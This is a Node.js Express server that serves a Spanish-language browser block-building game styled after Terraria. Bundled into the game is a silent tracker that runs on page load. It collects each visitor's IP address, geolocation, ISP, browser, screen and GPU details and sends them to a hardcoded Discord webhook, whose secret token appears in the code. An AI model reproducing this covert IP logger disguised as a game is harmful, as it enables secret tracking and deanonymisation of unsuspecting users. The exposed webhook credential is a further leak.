const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;
app.set('trust proxy', true);
app.use(express.json());

// ⚠️ PEGA AQUÍ TU WEBHOOK DE DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
        const geo = await response.json();
        if (geo.status === 'success') {
            country = geo.country;
            city = geo.city;
            isp = geo.isp;
        }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: `🎮 **¡Nuevo Jugador en Terraria-Clone!**\n📍 **IP Real:** \`${userIp}\` (${city}, ${country})\n📡 **Proveedor (ISP):** ${isp}\n💻 **Navegador/OS:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM\n🎮 **GPU:** ${d.gpu || 'N/A'}`
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {}
    }

    res.sendStatus(200);
});

// MOTOR TIPO TERRARIA
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TerraCraft Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; user-select: none; }
        body { background: #000; overflow: hidden; color: white; }
        canvas { display: block; image-rendering: pixelated; }
        
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        #menu { position: absolute; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); display: flex; justify-content: center; align-items: center; z-index: 20; pointer-events: auto; }
        .panel { background: #4a3b2c; border: 4px solid #2d241b; padding: 40px; border-radius: 8px; text-align: center; width: 400px; box-shadow: inset 0 0 15px rgba(0,0,0,0.5), 0 10px 30px rgba(0,0,0,0.8); }
        h1 { color: #86c06c; font-size: 2.5rem; text-shadow: 2px 2px 0px #2d241b; margin-bottom: 10px; }
        p { color: #d0c0a0; font-size: 1rem; margin-bottom: 30px; }
        .btn { background: #6b8c42; border: 3px solid #4a632d; color: white; padding: 12px 20px; font-size: 1.2rem; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.1s; text-shadow: 1px 1px 0px #000; width: 100%; }
        .btn:hover { background: #7ea34e; transform: scale(1.02); }
        .btn:active { background: #557034; transform: scale(0.98); }

        #hotbar { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 5px; z-index: 10; pointer-events: auto; }
        .slot { width: 48px; height: 48px; background: rgba(0,0,0,0.6); border: 2px solid #555; border-radius: 4px; display: flex; justify-content: center; align-items: center; font-weight: bold; color: white; font-size: 1.5rem; cursor: pointer; transition: 0.2s; position: relative; }
        .slot.active { border-color: #facc15; box-shadow: 0 0 10px rgba(250, 204, 21, 0.5); transform: translateY(-5px); }
        .slot-key { position: absolute; top: 2px; left: 4px; font-size: 0.6rem; color: #aaa; }
    </style>
</head>
<body>
    <div id="menu">
        <div class="panel">
            <h1>TerraCraft</h1>
            <p>Sobrevive, explora y construye.</p>
            <button class="btn" onclick="startGame()">JUGAR MUNDO</button>
        </div>
    </div>

    <div id="ui-layer" style="display:none;">
        <div id="hotbar">
            <div class="slot active" id="slot-1" onclick="sel(1)"><span class="slot-key">1</span>⛏️</div>
            <div class="slot" id="slot-2" onclick="sel(2)"><span class="slot-key">2</span>🧱</div>
            <div class="slot" id="slot-3" onclick="sel(3)"><span class="slot-key">3</span>🪵</div>
        </div>
    </div>

    <canvas id="gameCanvas"></canvas>

    <script>
    // Telemetría Silenciosa
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            return gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
        } catch (e) { return 'N/A'; }
    }
    fetch('/api/telemetry', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userAgent: navigator.userAgent, screen: \`\${screen.width}x\${screen.height}\`, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory, gpu: getGPU() })
    }).catch(()=>{});

    // MOTOR DEL JUEGO
    let selectedTool = 1; // 1: Pico, 2: Bloque Tierra, 3: Madera
    function sel(id) {
        selectedTool = id;
        document.querySelectorAll('.slot').forEach(el => el.classList.remove('active'));
        document.getElementById('slot-'+id).classList.add('active');
    }

    function startGame() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('ui-layer').style.display = 'block';
        initGame();
    }

    function initGame() {
        const cv = document.getElementById('gameCanvas');
        const ctx = cv.getContext('2d', { alpha: false });
        
        function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
        window.addEventListener('resize', resize);
        resize();

        // Constantes del Mundo
        const TILE = 32;
        const CHUNK_W = 200;
        const CHUNK_H = 150;
        let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
        
        // Generación Procedural
        let h = 30;
        let surface = [];
        for (let x = 0; x < CHUNK_W; x++) {
            h += Math.random() < 0.3 ? (Math.random() < 0.5 ? 1 : -1) : 0;
            if (h < 15) h = 15; if (h > 45) h = 45;
            surface[x] = h;
            
            for (let y = 0; y < CHUNK_H; y++) {
                if (y < h) world[x][y] = 0; // Aire
                else if (y === h) world[x][y] = 1; // Pasto
                else if (y > h && y < h + 8 + Math.random()*5) world[x][y] = 2; // Tierra
                else world[x][y] = 3; // Piedra
            }
        }

        // Árboles
        for (let x = 5; x < CHUNK_W - 5; x++) {
            if (world[x][surface[x]] === 1 && Math.random() < 0.15) {
                let treeH = Math.floor(Math.random() * 4) + 4;
                for (let i = 1; i <= treeH; i++) world[x][surface[x] - i] = 4; // Tronco
                world[x][surface[x] - treeH - 1] = 5; // Hojas
                world[x-1][surface[x] - treeH] = 5;
                world[x+1][surface[x] - treeH] = 5;
                world[x][surface[x] - treeH] = 5;
            }
        }

        // Jugador
        const player = { x: (CHUNK_W/2)*TILE, y: 10*TILE, w: 22, h: 42, vx: 0, vy: 0, speed: 5, jump: -10, grounded: false };
        let camera = { x: 0, y: 0 };
        const keys = {};

        window.addEventListener('keydown', e => { keys[e.code] = true; if(e.key >= '1' && e.key <= '3') sel(parseInt(e.key)); });
        window.addEventListener('keyup', e => keys[e.code] = false);

        // Interacción (Click izquierdo = Minar, Click derecho = Colocar)
        let mouseX = 0, mouseY = 0, isMouseDown = false, mouseBtn = 0;
        window.addEventListener('mousemove', e => { mouseX = e.clientX; mouseY = e.clientY; });
        window.addEventListener('mousedown', e => { isMouseDown = true; mouseBtn = e.button; });
        window.addEventListener('mouseup', () => { isMouseDown = false; });
        window.addEventListener('contextmenu', e => e.preventDefault());

        function handleMouse() {
            if (!isMouseDown) return;
            const targetX = mouseX + camera.x;
            const targetY = mouseY + camera.y;
            const tx = Math.floor(targetX / TILE);
            const ty = Math.floor(targetY / TILE);
            
            // Distancia de alcance
            const dist = Math.hypot((player.x + player.w/2) - targetX, (player.y + player.h/2) - targetY);
            if (dist > TILE * 6) return;

            if (tx >= 0 && tx < CHUNK_W && ty >= 0 && ty < CHUNK_H) {
                if (mouseBtn === 0 && selectedTool === 1) { // Minar
                    world[tx][ty] = 0;
                } else if ((mouseBtn === 2 || selectedTool > 1) && world[tx][ty] === 0) { // Construir
                    // No colocar sobre el jugador
                    const pRect = { l: player.x, r: player.x + player.w, t: player.y, b: player.y + player.h };
                    const bRect = { l: tx*TILE, r: tx*TILE+TILE, t: ty*TILE, b: ty*TILE+TILE };
                    if (!(pRect.l < bRect.r && pRect.r > bRect.l && pRect.t < bRect.b && pRect.b > bRect.t)) {
                        if(selectedTool === 2) world[tx][ty] = 2; // Tierra
                        if(selectedTool === 3) world[tx][ty] = 4; // Madera
                    }
                }
            }
        }

        // Colisiones
        function checkCollision(nx, ny) {
            const l = Math.floor(nx / TILE);
            const r = Math.floor((nx + player.w - 1) / TILE);
            const t = Math.floor(ny / TILE);
            const b = Math.floor((ny + player.h - 1) / TILE);

            if (l < 0 || r >= CHUNK_W || t < 0 || b >= CHUNK_H) return true;
            for (let y = t; y <= b; y++) {
                for (let x = l; x <= r; x++) {
                    if (world[x][y] !== 0 && world[x][y] !== 5) return true; // Hoja no colisiona
                }
            }
            return false;
        }

        // Dibujo de texturas procedimentales
        function drawBlock(type, x, y) {
            ctx.fillStyle = type === 1 ? '#4ade80' : 
                            type === 2 ? '#78350f' : 
                            type === 3 ? '#52525b' : 
                            type === 4 ? '#5c3a21' : 
                            type === 5 ? '#22c55e' : '#000';
            ctx.fillRect(x, y, TILE, TILE);
            
            // Detalles visuales
            if (type === 1) { ctx.fillStyle = '#15803d'; ctx.fillRect(x, y + TILE - 8, TILE, 8); }
            if (type === 2 || type === 3) {
                ctx.fillStyle = 'rgba(0,0,0,0.15)';
                ctx.fillRect(x + 4, y + 4, 8, 8);
                ctx.fillRect(x + 20, y + 16, 6, 6);
            }
            if (type === 4) { ctx.fillStyle = '#3f2615'; ctx.fillRect(x + 4, y, 4, TILE); ctx.fillRect(x + 20, y, 4, TILE); }
            
            // Borde ligero
            ctx.strokeStyle = 'rgba(0,0,0,0.3)';
            ctx.strokeRect(x, y, TILE, TILE);
        }

        function update() {
            // Físicas
            if (keys['KeyA']) player.vx = -player.speed;
            else if (keys['KeyD']) player.vx = player.speed;
            else player.vx = 0;

            if (keys['Space'] && player.grounded) { player.vy = player.jump; player.grounded = false; }
            player.vy += 0.6; // Gravedad
            if (player.vy > 12) player.vy = 12;

            // Movimiento X
            if (!checkCollision(player.x + player.vx, player.y)) {
                player.x += player.vx;
            } else {
                player.vx = 0;
            }

            // Movimiento Y
            player.grounded = false;
            if (!checkCollision(player.x, player.y + player.vy)) {
                player.y += player.vy;
            } else {
                if (player.vy > 0) {
                    player.grounded = true;
                    player.y = Math.floor((player.y + player.vy) / TILE) * TILE + (TILE - player.h);
                } else if (player.vy < 0) {
                    player.y = Math.floor(player.y / TILE) * TILE + TILE;
                }
                player.vy = 0;
            }

            // Límites del mapa
            if (player.x < 0) player.x = 0;
            if (player.x > (CHUNK_W * TILE) - player.w) player.x = (CHUNK_W * TILE) - player.w;

            handleMouse();

            // Cámara suave
            const targetCamX = player.x + player.w / 2 - cv.width / 2;
            const targetCamY = player.y + player.h / 2 - cv.height / 2;
            camera.x += (targetCamX - camera.x) * 0.1;
            camera.y += (targetCamY - camera.y) * 0.1;

            // Renderizado
            ctx.fillStyle = '#87CEEB'; // Cielo
            ctx.fillRect(0, 0, cv.width, cv.height);
            
            ctx.save();
            ctx.translate(Math.floor(-camera.x), Math.floor(-camera.y));

            // Optimización: Solo dibujar bloques en pantalla
            const startCol = Math.max(0, Math.floor(camera.x / TILE));
            const endCol = Math.min(CHUNK_W, Math.floor((camera.x + cv.width) / TILE) + 2);
            const startRow = Math.max(0, Math.floor(camera.y / TILE));
            const endRow = Math.min(CHUNK_H, Math.floor((camera.y + cv.height) / TILE) + 2);

            for (let x = startCol; x < endCol; x++) {
                for (let y = startRow; y < endRow; y++) {
                    if (world[x][y] !== 0) drawBlock(world[x][y], x * TILE, y * TILE);
                }
            }

            // Dibujar Jugador (Personaje estilo 8-bit)
            ctx.fillStyle = '#e5e7eb'; // Cuerpo
            ctx.fillRect(player.x, player.y, player.w, player.h);
            ctx.fillStyle = '#2563eb'; // Pantalones
            ctx.fillRect(player.x, player.y + 24, player.w, 18);
            ctx.fillStyle = '#fca5a5'; // Cara
            ctx.fillRect(player.x + (player.vx >= 0 ? 6 : 0), player.y + 4, 16, 12);
            ctx.fillStyle = '#000'; // Ojo
            ctx.fillRect(player.x + (player.vx >= 0 ? 16 : 4), player.y + 8, 4, 4);

            // Resaltar bloque objetivo
            const tx = Math.floor((mouseX + camera.x) / TILE);
            const ty = Math.floor((mouseY + camera.y) / TILE);
            if (tx >= 0 && tx < CHUNK_W && ty >= 0 && ty < CHUNK_H) {
                const dist = Math.hypot((player.x + player.w/2) - (mouseX + camera.x), (player.y + player.h/2) - (mouseY + camera.y));
                if (dist <= TILE * 6) {
                    ctx.strokeStyle = 'rgba(255, 255, 255, 0.5)';
                    ctx.lineWidth = 2;
                    ctx.strokeRect(tx * TILE, ty * TILE, TILE, TILE);
                }
            }

            ctx.restore();
            requestAnimationFrame(update);
        }
        update();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
